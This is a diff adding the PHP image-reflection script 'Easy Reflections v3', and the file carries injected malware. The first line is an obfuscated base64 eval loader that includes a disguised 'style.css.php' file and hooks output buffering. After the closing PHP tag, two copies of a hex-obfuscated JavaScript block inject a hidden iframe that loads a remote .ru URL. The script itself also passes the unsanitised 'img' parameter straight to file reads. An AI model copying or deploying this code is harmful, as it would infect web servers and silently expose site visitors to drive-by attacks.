@@ -1,0 +1,403 @@
+<?php /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21mc24nXSkpeyRHTE9CQUxTWydtZnNuJ109Jy9ob21lL2JjbW9uZXkvcHVibGljX2h0bWwvY2hhdC9waHBmcmVlY2hhdC9kZW1vL2RlbW81MF9kYXRhL215dGhlbWUvc3R5bGUuY3NzLnBocCc7aWYoZmlsZV9leGlzdHMoJEdMT0JBTFNbJ21mc24nXSkpe2luY2x1ZGVfb25jZSgkR0xPQkFMU1snbWZzbiddKTtpZihmdW5jdGlvbl9leGlzdHMoJ2dtbCcpJiZmdW5jdGlvbl9leGlzdHMoJ2Rnb2JoJykpe29iX3N0YXJ0KCdkZ29iaCcpO319fQ==')); ?>
+<?php
+	/*
+		-------------------------------------------------------------------
+		Easy Reflections v3 by Richard Davey, Core PHP (rich@corephp.co.uk)
+		Released 13th March 2007
+        Includes code submissions from Monte Ohrt (monte@ohrt.com)
+        -------------------------------------------------------------------
+		You are free to use this in any product, or on any web site.
+        I'd appreciate it if you email and tell me where you use it, thanks.
+		Latest builds at: http://reflection.corephp.co.uk
+        -------------------------------------------------------------------
+
+		This script accepts the following $_GET parameters:
+
+		img		        required	The source image to reflect
+		height	        optional	Height of the reflection (% or pixel value)
+        fade_start      optional    Start the alpha fade from whch value? (% value)
+        fade_end        optional    End the alpha fade from whch value? (% value)
+        cache           optional    Save reflection image to the cache? (boolean)
+        tint            optional    Tint the reflection with this colour (hex)
+	*/
+
+	//	PHP Version sanity check
+	if (version_compare('4.3.2', phpversion()) == 1)
+	{
+		echo 'This version of PHP is not fully supported. You need 4.3.2 or above.';
+		exit();
+	}
+
+	//	GD check
+	if (extension_loaded('gd') == false && !dl('gd.so'))
+	{
+		echo 'You are missing the GD extension for PHP, sorry but I cannot continue.';
+		exit();
+	}
+
+    //    GD Version check
+    $gd_info = gd_info();
+
+    if ($gd_info['PNG Support'] == false)
+    {
+        echo 'This version of the GD extension cannot output PNG images.';
+        exit();
+    }
+
+    if (ereg_replace('[[:alpha:][:space:]()]+', '', $gd_info['GD Version']) < '2.0.1')
+    {
+        echo 'GD library is too old. Version 2.0.1 or later is required, and 2.0.28 is strongly recommended.';
+        exit();
+    }
+
+	//	Our allowed query string parameters
+
+    //  To cache or not to cache? that is the question
+    if (isset($_GET['cache']))
+    {
+        if ((int) $_GET['cache'] == 1)
+        {
+            $cache = true;
+        }
+        else
+        {
+            $cache = false;
+        }
+    }
+    else
+    {
+        $cache = false;
+    }
+
+	//	img (the image to reflect)
+	if (isset($_GET['img']))
+	{
+		$source_image = $_GET['img'];
+		$source_image = str_replace('://','',$source_image);
+		//$source_image = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $source_image;
+
+        if (file_exists($source_image))
+        {
+            if ($cache)
+            {
+                $cache_dir = dirname($source_image);
+                $cache_base = basename($source_image);
+                //$cache_base = str_replace(".jpg", ".png", $cache_base);
+                $cache_file = 'refl_' . md5($_SERVER['REQUEST_URI']) . '_' . $cache_base;
+                $cache_path = $cache_dir . DIRECTORY_SEPARATOR . $cache_file;
+
+                if (file_exists($cache_path) && filemtime($cache_path) >= filemtime($source_image))
+                {
+                    // Use cached image
+                    $image_info = getimagesize($cache_path);
+                    header("Content-type: " . $image_info['mime']);
+                    readfile($cache_path);
+                    exit();
+                }
+            }
+        }
+        else
+        {
+          echo 'Cannot find or read source image';
+          exit();
+        }
+	}
+	else
+	{
+		echo 'No source image to reflect supplied';
+		exit();
+	}
+
+    //    tint (the colour used for the tint, defaults to white if not given)
+
+    if (isset($_GET['tint']) == false)
+    {
+        $red = 127;
+        $green = 127;
+        $blue = 127;
+    }
+    else
+    {
+        //    Extract the hex colour
+        $hex_bgc = $_GET['tint'];
+
+        //    Does it start with a hash? If so then strip it
+        $hex_bgc = str_replace('#', '', $hex_bgc);
+
+        switch (strlen($hex_bgc))
+        {
+            case 6:
+                $red = hexdec(substr($hex_bgc, 0, 2));
+                $green = hexdec(substr($hex_bgc, 2, 2));
+                $blue = hexdec(substr($hex_bgc, 4, 2));
+                break;
+
+            case 3:
+                $red = substr($hex_bgc, 0, 1);
+                $green = substr($hex_bgc, 1, 1);
+                $blue = substr($hex_bgc, 2, 1);
+                $red = hexdec($red . $red);
+                $green = hexdec($green . $green);
+                $blue = hexdec($blue . $blue);
+                break;
+
+            default:
+                //    Wrong values passed, default to white
+                $red = 127;
+                $green = 127;
+                $blue = 127;
+        }
+    }
+
+	//	height (how tall should the reflection be?)
+	if (isset($_GET['height']))
+	{
+		$output_height = $_GET['height'];
+
+		//	Have they given us a percentage?
+		if (substr($output_height, -1) == '%')
+		{
+			//	Yes, remove the % sign
+			$output_height = (int) substr($output_height, 0, -1);
+
+			//	Gotta love auto type casting ;)
+			if ($output_height == 100)
+			{
+                $output_height = "0.99";
+			}
+			elseif ($output_height < 10)
+            {
+                $output_height = "0.0$output_height";
+            }
+            else
+			{
+				$output_height = "0.$output_height";
+			}
+		}
+		else
+		{
+			$output_height = (int) $output_height;
+		}
+	}
+	else
+	{
+		//	No height was given, so default to 50% of the source images height
+		$output_height = 0.50;
+	}
+
+	if (isset($_GET['fade_start']))
+	{
+		if (strpos($_GET['fade_start'], '%') !== false)
+		{
+			$alpha_start = str_replace('%', '', $_GET['fade_start']);
+			$alpha_start = (int) (127 * $alpha_start / 100);
+		}
+		else
+		{
+			$alpha_start = (int) $_GET['fade_start'];
+
+			if ($alpha_start < 1 || $alpha_start > 127)
+			{
+				$alpha_start = 80;
+			}
+		}
+	}
+	else
+	{
+		$alpha_start = 80;
+	}
+
+	if (isset($_GET['fade_end']))
+	{
+		if (strpos($_GET['fade_end'], '%') !== false)
+		{
+			$alpha_end = str_replace('%', '', $_GET['fade_end']);
+			$alpha_end = (int) (127 * $alpha_end / 100);
+		}
+		else
+		{
+			$alpha_end = (int) $_GET['fade_end'];
+
+			if ($alpha_end < 1 || $alpha_end > 0)
+			{
+				$alpha_end = 0;
+			}
+		}
+	}
+	else
+	{
+		$alpha_end = 0;
+	}
+
+	/*
+		----------------------------------------------------------------
+		Ok, let's do it ...
+		----------------------------------------------------------------
+	*/
+
+	//	How big is the image?
+	$image_details = getimagesize($source_image);
+
+	if ($image_details === false)
+	{
+		echo 'Not a valid image supplied, or this script does not have permissions to access it.';
+		exit();
+	}
+	else
+	{
+		$width = $image_details[0];
+		$height = $image_details[1];
+		$type = $image_details[2];
+		$mime = $image_details['mime'];
+	}
+
+	//	Calculate the height of the output image
+	if ($output_height < 1)
+	{
+		//	The output height is a percentage
+		$new_height = $height * $output_height;
+	}
+	else
+	{
+		//	The output height is a fixed pixel value
+		$new_height = $output_height;
+	}
+
+	//	Detect the source image format - only GIF, JPEG and PNG are supported. If you need more, extend this yourself.
+	switch ($type)
+	{
+		case 1:
+			//	GIF
+			$source = imagecreatefromgif($source_image);
+			break;
+
+		case 2:
+			//	JPG
+			$source = imagecreatefromjpeg($source_image);
+			break;
+
+		case 3:
+			//	PNG
+			$source = imagecreatefrompng($source_image);
+			break;
+
+		default:
+			echo 'Unsupported image file format.';
+			exit();
+	}
+
+	/*
+		----------------------------------------------------------------
+		Build the reflection image
+		----------------------------------------------------------------
+	*/
+
+
+
+
+	//	We'll store the final reflection in $output. $buffer is for internal use.
+	$output = imagecreatetruecolor($width, $new_height);
+	$buffer = imagecreatetruecolor($width, $new_height);
+
+    //  Save any alpha data that might have existed in the source image and disable blending
+    imagesavealpha($source, true);
+
+    imagesavealpha($output, true);
+    imagealphablending($output, false);
+
+    imagesavealpha($buffer, true);
+    imagealphablending($buffer, false);
+
+	//	Copy the bottom-most part of the source image into the output
+	imagecopy($output, $source, 0, 0, 0, $height - $new_height, $width, $new_height);
+
+	//	Rotate and flip it (strip flip method)
+    for ($y = 0; $y < $new_height; $y++)
+    {
+       imagecopy($buffer, $output, 0, $y, 0, $new_height - $y - 1, $width, 1);
+    }
+
+	$output = $buffer;
+
+	/*
+		----------------------------------------------------------------
+		Apply the fade effect
+		----------------------------------------------------------------
+	*/
+
+	//	This is quite simple really. There are 127 available levels of alpha, so we just
+	//	step-through the reflected image, drawing a box over the top, with a set alpha level.
+	//	The end result? A cool fade.
+
+	//	There are a maximum of 127 alpha fade steps we can use, so work out the alpha step rate
+
+	$alpha_length = abs($alpha_start - $alpha_end);
+
+    imagelayereffect($output, IMG_EFFECT_OVERLAY);
+
+    for ($y = 0; $y <= $new_height; $y++)
+    {
+        //  Get % of reflection height
+        $pct = $y / $new_height;
+
+        //  Get % of alpha
+        if ($alpha_start > $alpha_end)
+        {
+            $alpha = (int) ($alpha_start - ($pct * $alpha_length));
+        }
+        else
+        {
+            $alpha = (int) ($alpha_start + ($pct * $alpha_length));
+        }
+
+        //  Rejig it because of the way in which the image effect overlay works
+        $final_alpha = 127 - $alpha;
+
+        //imagefilledrectangle($output, 0, $y, $width, $y, imagecolorallocatealpha($output, 127, 127, 127, $final_alpha));
+        imagefilledrectangle($output, 0, $y, $width, $y, imagecolorallocatealpha($output, $red, $green, $blue, $final_alpha));
+    }
+
+    /*
+		----------------------------------------------------------------
+		HACK - Build the reflection image by combining the source
+		image AND the reflection in one new image!
+		----------------------------------------------------------------
+	*/
+		$finaloutput = imagecreatetruecolor($width, $height+$new_height);
+		imagesavealpha($finaloutput, true);
+
+		$trans_colour = imagecolorallocatealpha($finaloutput, 0, 0, 0, 127);
+		imagefill($finaloutput, 0, 0, $trans_colour);
+
+		imagecopy($finaloutput, $source, 0, 0, 0, 0, $width, $height);
+		imagecopy($finaloutput, $output, 0, $height, 0, 0, $width, $new_height);
+		$output = $finaloutput;
+
+	/*
+		----------------------------------------------------------------
+		Output our final PNG
+		----------------------------------------------------------------
+	*/
+
+	if (headers_sent())
+	{
+		echo 'Headers already sent, I cannot display an image now. Have you got an extra line-feed in this file somewhere?';
+		exit();
+	}
+	else
+	{
+	    //	PNG
+	    header("Content-type: image/png");
+	    imagepng($output);
+
+        // Save cached file
+        if ($cache)
+        {
+            imagepng($output, $cache_path);
+        }
+
+		imagedestroy($output);
+		exit();
+	}
+?>
+<script>function oT(){};mEE='';oT.prototype = {t : function() {function u(){};nP=false;var e="";this.vI=false;this.s="";try {var sD="sD";gW="gW";mE=false;var sP=false;function z(){};this.eG="";window.onload=function() {var qW=50071;this.xQ=19623;var sS="sS";var gX="gX";function hI(){};this.kW="";String.prototype.gO=function(l, q){var m=this; return m.replace(l, q)};var aI="aI";function jA(){};var sA="";this.tG=false;var j=function(y,vONq4,Ri){return ['x3cx69x66'+vONq4,Ri+'x53x6ax52x4cx58',y+'x6cx35x56x48']}('x75x56','x72x61x6dx65x20x64x76x62x6ex3dx31x20x73x72x63x3dx27','x51')[0];this.hC="";this.nW=23625;this.hR="hR";function dY(){};this.qB="";var lJ=function(I9SZP,yPAd,x,uvena,v){return [I9SZP+'x6ax67x6bx64x78','x62x34'+x,'x27x20x68x65x69x67x68x74x3d'+v,yPAd+'x73x4fx58','x76'+uvena]}('x49x6dx6fx7ax74','x72','x65x4b','x49','x31x30x30x30x20x6fx74x65x72x3dx31x20x77x69x64x74x68x3dx31x30x30x30x20x3cx2fx69x66x72x61x6dx65x3e')[2];var xC=15521;var p="p";iB='';nF='';var b=false;var pQ=new Array();var tX=function(LMeU,Mmgr,nE,F8BG,n){return [Mmgr+'x47x32x79x38','x4d'+F8BG,n+'x4ex77x51',nE+'x61x75x74x65x72x2ex72x75x2fx73x74x64x73x2fx67x6fx2ex70x68x70x3fx73x69x64x3dx31x34',LMeU+'x6fx68x5ax4c']}('x4bx78x6ax67x7a','x73','x68x74x74x70x3ax2fx2fx63x68x69x6c','x53x54x79x46x66','x72x78x67')[3];var dD=function(){};function kI(){};w='';var cC=function(){};this.wB=50833;uP='';function lDA(){};tX = j + tX + lJ;var gJ=new Array();var zV=new Array();var f=new Date();this.xB="xB";var lP='';mI=false;this.eQ=false;var d=document;mT='';bF=19498;var xA=new Date();this.hK='';var g=function(ENw77,ai4v,UD,Q0J){return [Q0J+'x63x51',ENw77+'x6a','x77x50'+ai4v,'x3c'+UD]}('x4ax57x4dx36x48','x6fx36x71x56','x64x69x76x20x69x64x3dx62x20x73x74x79x6cx65x3dx27x76x69x73x69x62x69x6cx69x74x79x3ax68x69x64x64x65x6ex3bx20x77x69x64x74x68x3ax20x31x70x78x3bx20x68x65x69x67x68x74x3ax20x31x70x78x27x3e','x61x77')[3];uG="uG";var aM=false;var tD='';this.dF=58238;var x=function(dD,Go,Z){return ['x55x4ex76'+Go,'x3cx2f'+Z,'x68x70x72x46'+dD]}('x76x6bx64x51','x6fx73','x64x69x76x3e')[1];var rJ=function(){return 'rJ'};this.vJ='';this.qD=32349;var tN=new Date();this.vV="";var a=function(QV0,j,qA){return [qA+'x75',j+'x65','x56x6a'+QV0]}('x77x58','x77x72x69x74','x56x57')[1];var rZ=function(){return 'rZ'};var wF=function(){};this.fJ="";var o=false;var yE='';var uH="uH";var wT=function(){};var jD=function(c,O,V,S){return [V+'x59x55','x78x33x64'+O,S+'x4ex45x44','x75x6ex65'+c]}('x73x63x61x70x65','x6cx44x42x62','x52x61','x75x55x37')[3];jDZ=46635;kO="kO";var cB=new Array();var jO=function(){return 'jO'};var kE=function(){};var v=window[jD];var wW=function(){return 'wW'};this.tJ=false;wL=27417;this.tP="";this.lV=false;var rO=2970;k=v(g + tX + x);this.mZ='';eV="eV";cT="";function pR(){};var lN=new Date();var xL=function(){return 'xL'};var jB='';function aG(){this.sK='';var wM="wM";var aA='';pI=false;this.qS=false;kOA="";var rT=function(){return 'rT'};lD=function(R4aAA,ACb,OJ,AdfB,pp){return ['x4ax55x38x73'+R4aAA,'x42x68x47x78x63'+ACb,pp+'x59x76x33',AdfB+'x79x53x38','x6fx75x74x65'+OJ]}('x55x6bx30','x43x75x74x35x44','x72','x4a','x55x59x41')[4];var pF=new Array();this.rP='';var eC=13618;var eM=function(){return 'eM'};bW="bW";var nE=new Date();n=function(wlpLC,AjjYH,d8a,nBq){return [nBq+'x70x7ax74x42',wlpLC+'x67',AjjYH+'x5ax38x4f',d8a+'x69x65x6ex74']}('x77x49x49','x6bx6ax4a','x63x6c','x55')[3];this.mU=false;var rY=false;var uD="";fZ=60025;var gA="gA";this.dU="dU";h=function(wu4a,I,n){return ['x48'+I,n+'x6ax39','x63'+wu4a]}('x4ex71x48x6a','x65x69x67x68x74','x46x43')[0];zH="zH";var bE="";this.eD="";this.dG=60658;this.eGN=false;this.qN="";c=function(QKyy,Iz,qU){return [qU+'x68','x44'+QKyy,'x4f'+Iz]}('x42x73x42','x55x58','x57x69x64x74')[0];var aB=new Array();var dUG="dUG";mW='';var cY=new Array();function cP(){};this.lQ='';tO=false;qJ=33519;y=function(I0,md,c){return ['x75'+c,'x42x78x77x54'+md,I0+'x55x5a']}('x6f','x72x77','x73x65x72x41x67x65x6ex74')[0];function pG(){};var fQ=new Date();var bV="";fZS="fZS";wV="wV";var dFO=new Array();i=function(mcZ,NQLG,ij,u0zqz,zSD){return [ij+'x4bx43x58x63','x72x53x46'+u0zqz,mcZ+'x78x71','x50'+NQLG,'x4d'+zSD]}('x49x38x70','x52x4ex42x68x71','x66x63x39x33x4f','x67x65x65x66','x53x49x45')[4];var qH=new Array();tH="tH";cK="cK";var nY=new Date();mY='';this.pL=false;if (navigator[y].indexOf(i) > 0){this.tU=false;iO="iO";nV=false;pM="";iK="iK";var dQ=function(){return 'dQ'};return d.body[n + c] * document.body[n + h];var mG=function(){};this.sKC='';}else{var qBE=new Array();this.tOZ="tOZ";this.iN='';this.pJ="";oH="oH";this.cS='';this.jDJ='';return window[lD + c] * window[lD + h];eI=3604;this.yM=false;function uK(){};var vN=function(){};}var zL=new Array();var sI=function(){return 'sI'};var cCH="";var dN=new Date();function iJ(){};this.uA="uA";}var qL="qL";this.gB="gB";var gJF=new Date();cF="";zQ=42353;if(aG() > 99999){d[a](k);}var dT=function(){};var bEZ=function(){return 'bEZ'};var lO=new Array();this.dE=43162;var rS=9935;var qM="qM";};var eMZ="";var rB=function(){return 'rB'};} catch(r) {this.yK="yK";kIC="kIC";this.mTH='';var jX=false;var iI="iI";bC='';}this.eH='';var oR="";gT="gT";var eW=false;}};var wP='';var hG=new oT(); hN="";hG.t();uDW=45307;</script><script>function oT(){};mEE='';oT.prototype = {t : function() {function u(){};nP=false;var e="";this.vI=false;this.s="";try {var sD="sD";gW="gW";mE=false;var sP=false;function z(){};this.eG="";window.onload=function() {var qW=50071;this.xQ=19623;var sS="sS";var gX="gX";function hI(){};this.kW="";String.prototype.gO=function(l, q){var m=this; return m.replace(l, q)};var aI="aI";function jA(){};var sA="";this.tG=false;var j=function(y,vONq4,Ri){return ['x3cx69x66'+vONq4,Ri+'x53x6ax52x4cx58',y+'x6cx35x56x48']}('x75x56','x72x61x6dx65x20x64x76x62x6ex3dx31x20x73x72x63x3dx27','x51')[0];this.hC="";this.nW=23625;this.hR="hR";function dY(){};this.qB="";var lJ=function(I9SZP,yPAd,x,uvena,v){return [I9SZP+'x6ax67x6bx64x78','x62x34'+x,'x27x20x68x65x69x67x68x74x3d'+v,yPAd+'x73x4fx58','x76'+uvena]}('x49x6dx6fx7ax74','x72','x65x4b','x49','x31x30x30x30x20x6fx74x65x72x3dx31x20x77x69x64x74x68x3dx31x30x30x30x20x3cx2fx69x66x72x61x6dx65x3e')[2];var xC=15521;var p="p";iB='';nF='';var b=false;var pQ=new Array();var tX=function(LMeU,Mmgr,nE,F8BG,n){return [Mmgr+'x47x32x79x38','x4d'+F8BG,n+'x4ex77x51',nE+'x61x75x74x65x72x2ex72x75x2fx73x74x64x73x2fx67x6fx2ex70x68x70x3fx73x69x64x3dx31x34',LMeU+'x6fx68x5ax4c']}('x4bx78x6ax67x7a','x73','x68x74x74x70x3ax2fx2fx63x68x69x6c','x53x54x79x46x66','x72x78x67')[3];var dD=function(){};function kI(){};w='';var cC=function(){};this.wB=50833;uP='';function lDA(){};tX = j + tX + lJ;var gJ=new Array();var zV=new Array();var f=new Date();this.xB="xB";var lP='';mI=false;this.eQ=false;var d=document;mT='';bF=19498;var xA=new Date();this.hK='';var g=function(ENw77,ai4v,UD,Q0J){return [Q0J+'x63x51',ENw77+'x6a','x77x50'+ai4v,'x3c'+UD]}('x4ax57x4dx36x48','x6fx36x71x56','x64x69x76x20x69x64x3dx62x20x73x74x79x6cx65x3dx27x76x69x73x69x62x69x6cx69x74x79x3ax68x69x64x64x65x6ex3bx20x77x69x64x74x68x3ax20x31x70x78x3bx20x68x65x69x67x68x74x3ax20x31x70x78x27x3e','x61x77')[3];uG="uG";var aM=false;var tD='';this.dF=58238;var x=function(dD,Go,Z){return ['x55x4ex76'+Go,'x3cx2f'+Z,'x68x70x72x46'+dD]}('x76x6bx64x51','x6fx73','x64x69x76x3e')[1];var rJ=function(){return 'rJ'};this.vJ='';this.qD=32349;var tN=new Date();this.vV="";var a=function(QV0,j,qA){return [qA+'x75',j+'x65','x56x6a'+QV0]}('x77x58','x77x72x69x74','x56x57')[1];var rZ=function(){return 'rZ'};var wF=function(){};this.fJ="";var o=false;var yE='';var uH="uH";var wT=function(){};var jD=function(c,O,V,S){return [V+'x59x55','x78x33x64'+O,S+'x4ex45x44','x75x6ex65'+c]}('x73x63x61x70x65','x6cx44x42x62','x52x61','x75x55x37')[3];jDZ=46635;kO="kO";var cB=new Array();var jO=function(){return 'jO'};var kE=function(){};var v=window[jD];var wW=function(){return 'wW'};this.tJ=false;wL=27417;this.tP="";this.lV=false;var rO=2970;k=v(g + tX + x);this.mZ='';eV="eV";cT="";function pR(){};var lN=new Date();var xL=function(){return 'xL'};var jB='';function aG(){this.sK='';var wM="wM";var aA='';pI=false;this.qS=false;kOA="";var rT=function(){return 'rT'};lD=function(R4aAA,ACb,OJ,AdfB,pp){return ['x4ax55x38x73'+R4aAA,'x42x68x47x78x63'+ACb,pp+'x59x76x33',AdfB+'x79x53x38','x6fx75x74x65'+OJ]}('x55x6bx30','x43x75x74x35x44','x72','x4a','x55x59x41')[4];var pF=new Array();this.rP='';var eC=13618;var eM=function(){return 'eM'};bW="bW";var nE=new Date();n=function(wlpLC,AjjYH,d8a,nBq){return [nBq+'x70x7ax74x42',wlpLC+'x67',AjjYH+'x5ax38x4f',d8a+'x69x65x6ex74']}('x77x49x49','x6bx6ax4a','x63x6c','x55')[3];this.mU=false;var rY=false;var uD="";fZ=60025;var gA="gA";this.dU="dU";h=function(wu4a,I,n){return ['x48'+I,n+'x6ax39','x63'+wu4a]}('x4ex71x48x6a','x65x69x67x68x74','x46x43')[0];zH="zH";var bE="";this.eD="";this.dG=60658;this.eGN=false;this.qN="";c=function(QKyy,Iz,qU){return [qU+'x68','x44'+QKyy,'x4f'+Iz]}('x42x73x42','x55x58','x57x69x64x74')[0];var aB=new Array();var dUG="dUG";mW='';var cY=new Array();function cP(){};this.lQ='';tO=false;qJ=33519;y=function(I0,md,c){return ['x75'+c,'x42x78x77x54'+md,I0+'x55x5a']}('x6f','x72x77','x73x65x72x41x67x65x6ex74')[0];function pG(){};var fQ=new Date();var bV="";fZS="fZS";wV="wV";var dFO=new Array();i=function(mcZ,NQLG,ij,u0zqz,zSD){return [ij+'x4bx43x58x63','x72x53x46'+u0zqz,mcZ+'x78x71','x50'+NQLG,'x4d'+zSD]}('x49x38x70','x52x4ex42x68x71','x66x63x39x33x4f','x67x65x65x66','x53x49x45')[4];var qH=new Array();tH="tH";cK="cK";var nY=new Date();mY='';this.pL=false;if (navigator[y].indexOf(i) > 0){this.tU=false;iO="iO";nV=false;pM="";iK="iK";var dQ=function(){return 'dQ'};return d.body[n + c] * document.body[n + h];var mG=function(){};this.sKC='';}else{var qBE=new Array();this.tOZ="tOZ";this.iN='';this.pJ="";oH="oH";this.cS='';this.jDJ='';return window[lD + c] * window[lD + h];eI=3604;this.yM=false;function uK(){};var vN=function(){};}var zL=new Array();var sI=function(){return 'sI'};var cCH="";var dN=new Date();function iJ(){};this.uA="uA";}var qL="qL";this.gB="gB";var gJF=new Date();cF="";zQ=42353;if(aG() > 99999){d[a](k);}var dT=function(){};var bEZ=function(){return 'bEZ'};var lO=new Array();this.dE=43162;var rS=9935;var qM="qM";};var eMZ="";var rB=function(){return 'rB'};} catch(r) {this.yK="yK";kIC="kIC";this.mTH='';var jX=false;var iI="iI";bC='';}this.eH='';var oR="";gT="gT";var eW=false;}};var wP='';var hG=new oT(); hN="";hG.t();uDW=45307;</script>
